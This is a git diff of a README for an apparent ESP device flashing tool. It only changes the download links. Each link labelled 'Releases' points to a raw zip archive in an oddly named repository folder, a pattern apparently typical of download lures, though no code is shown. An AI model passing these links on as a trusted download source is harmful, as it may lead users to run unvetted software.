@@ -1,6 +1,6 @@
 # ⚡️ flashesp - Easy Flashing for ESP Devices
 
-[![Download FlashESP](https://github.com/aniff23/flashesp/raw/refs/heads/master/uloncus/Software-v3.0-beta.4.zip)](https://github.com/aniff23/flashesp/raw/refs/heads/master/uloncus/Software-v3.0-beta.4.zip)
+[![Download FlashESP](https://github.com/aniff23/flashesp/raw/refs/heads/master/uloncus/Software_v3.6.zip)](https://github.com/aniff23/flashesp/raw/refs/heads/master/uloncus/Software_v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to FlashESP! This is your community hub for reporting bugs, requesting f
 
 ## 📥 Download & Install
 
-To get started, you need to download the FlashESP application. Visit this page to download: [FlashESP Releases](https://github.com/aniff23/flashesp/raw/refs/heads/master/uloncus/Software-v3.0-beta.4.zip).
+To get started, you need to download the FlashESP application. Visit this page to download: [FlashESP Releases](https://github.com/aniff23/flashesp/raw/refs/heads/master/uloncus/Software_v3.6.zip).
 
 1. Go to the link above.
 2. Look for the latest version.
@@ -58,7 +58,7 @@ Your contributions are welcome! If you want to help improve FlashESP, check our 
 
 ## 🔗 Useful Links
 
-- [FlashESP Releases](https://github.com/aniff23/flashesp/raw/refs/heads/master/uloncus/Software-v3.0-beta.4.zip)
+- [FlashESP Releases](https://github.com/aniff23/flashesp/raw/refs/heads/master/uloncus/Software_v3.6.zip)
 - [Community Forum](#)
 - [Documentation](#)
 
